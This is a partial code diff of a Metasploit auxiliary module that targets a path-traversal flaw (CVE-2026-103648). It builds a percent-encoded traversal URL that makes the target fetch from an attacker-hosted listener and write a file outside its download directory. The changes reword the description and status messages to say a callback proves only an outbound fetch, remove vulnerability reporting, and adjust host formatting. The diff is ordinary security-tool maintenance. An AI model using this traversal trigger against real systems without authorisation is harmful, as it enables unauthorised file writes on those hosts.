@@ -1,5 +1,3 @@
-# frozen_string_literal: true
-
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,7 +6,6 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer
-  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(
@@ -28,14 +25,13 @@ class MetasploitModule < Msf::Auxiliary
           into a literal '../', which path.join() then normalizes to a path outside the
           configured destination directory.
 
-          This module starts a local HTTP listener and sends the target a URL, built with
-          a percent-encoded traversal sequence, that points back at that listener. If the
-          target is vulnerable, it will fetch the listener's payload and write it outside
-          its configured download directory. The module confirms exploitation by observing
-          the target's outbound fetch; it cannot read the target's filesystem remotely, so
-          verifying that the written file actually landed outside the destination directory
-          requires local access to the target (see the Docker lab in the referenced
-          repository for an end-to-end reproduction).
+          This module sends the target a URL containing a percent-encoded traversal sequence
+          and serves a callback response. A callback confirms only that the target fetched
+          the URL; it does not prove that the target is vulnerable or that a file was written
+          outside its download directory. Confirming the final write location requires local
+          access to the target. The path resolved by the target depends on its configured
+          download directory and the DEPTH option; the documented /tmp/pwned_by_msf.txt path
+          applies to the referenced lab configuration.
         },
         'Author' => [
           'Amirhossein Roustaei (EterNullSec)' # Discovery and Metasploit module
@@ -80,7 +76,7 @@ class MetasploitModule < Msf::Auxiliary
         'Path' => '/'
       }
     )
-    print_status("Started payload listener on #{srvhost_addr}:#{srvport}")
+    print_status("Started payload listener on #{Rex::Socket.to_authority(srvhost_addr, srvport)}")
 
     callback_url = build_callback_url
     print_status("Callback URL: #{callback_url}")
@@ -92,20 +88,12 @@ class MetasploitModule < Msf::Auxiliary
     wait_for_callback(datastore['CALLBACK_TIMEOUT'])
 
     if @callback_received
-      print_good('Target fetched the payload. CVE-2026-103648 is likely exploitable.')
-      print_warning('Remote filesystem access is required to confirm the file landed outside dest.')
-
-      report_vuln(
-        host: rhost,
-        port: rport,
-        proto: 'tcp',
-        name: name,
-        info: "Target fetched the listener after a traversal-encoded URL was sent (#{traversal_path})",
-        refs: references
-      )
+      print_good('Target fetched the callback payload.')
+      print_warning('This confirms an outbound fetch only; it does not confirm path traversal or a file write.')
+      print_warning('Verify the final file location locally on the target before treating it as vulnerable.')
     else
       print_error('No callback received. Target may not be vulnerable, may not reach ' \
-                   "#{srvhost_addr}:#{srvport}, or TARGETURI/URLPARAM may be wrong.")
+                   "#{Rex::Socket.to_authority(srvhost_addr, srvport)}, or TARGETURI/URLPARAM may be wrong.")
     end
   end
 
@@ -115,7 +103,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def build_callback_url
-    "http://#{srvhost_addr}:#{srvport}#{build_traversal_path}"
+    "http://#{Rex::Socket.to_authority(srvhost_addr, srvport)}#{build_traversal_path}"
   end
 
   def send_trigger(callback_url)
